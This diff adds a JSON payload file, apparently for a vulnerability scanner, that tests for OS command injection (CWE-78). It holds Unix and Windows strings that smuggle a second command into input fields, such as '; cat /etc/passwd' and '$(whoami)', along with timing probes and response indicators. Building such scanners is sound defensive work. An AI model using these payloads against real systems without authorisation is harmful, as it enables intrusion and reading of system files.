@@ -1,0 +1,56 @@
+{
+"meta": {
+"name": "Command Injection",
+"category": "Command Injection",
+"cwe": "CWE-78",
+"wasc": "WASC-31",
+"reference": "https://owasp.org/www-community/attacks/Command_Injection"
+},
+
+"payloads": [
+  { "value": "; id", "os": "unix" },
+  { "value": "| id", "os": "unix" },
+  { "value": "&& id", "os": "unix" },
+  { "value": "; whoami", "os": "unix" },
+  { "value": "| whoami", "os": "unix" },
+  { "value": "`id`", "os": "unix" },
+  { "value": "$(whoami)", "os": "unix" },
+  { "value": "; uname -a", "os": "unix" },
+  { "value": "; cat /etc/passwd", "os": "unix" },
+  { "value": "| cat /etc/passwd", "os": "unix" },
+  { "value": "; sleep 5", "os": "unix", "type": "time", "delay": 5 },
+  { "value": "&& sleep 5", "os": "unix", "type": "time", "delay": 5 },
+  { "value": "& dir", "os": "windows" },
+  { "value": "| dir", "os": "windows" },
+  { "value": "& whoami", "os": "windows" },
+  { "value": "& type C:\\Windows\\win.ini", "os": "windows" },
+  { "value": "& ipconfig", "os": "windows" },
+  { "value": "& ping -n 5 127.0.0.1", "os": "windows", "type": "time", "delay": 5 },
+  { "value": "%0a id", "os": "unix" },
+  { "value": ";id||whoami", "os": "unix" }
+],
+
+"indicators": [
+"uid=",
+"gid=",
+"root:",
+"daemon:",
+"www-data",
+"bin/bash",
+"bin/sh",
+"Linux",
+"Darwin",
+"Windows IP Configuration",
+"Volume Serial Number",
+"[fonts]",
+"for 16bit app support",
+"Directory of",
+"root:x:0:0",
+"PATH=",
+"HOME=",
+"USER=",
+"USERNAME=",
+"COMPUTERNAME=",
+"SHELL="
+]
+}
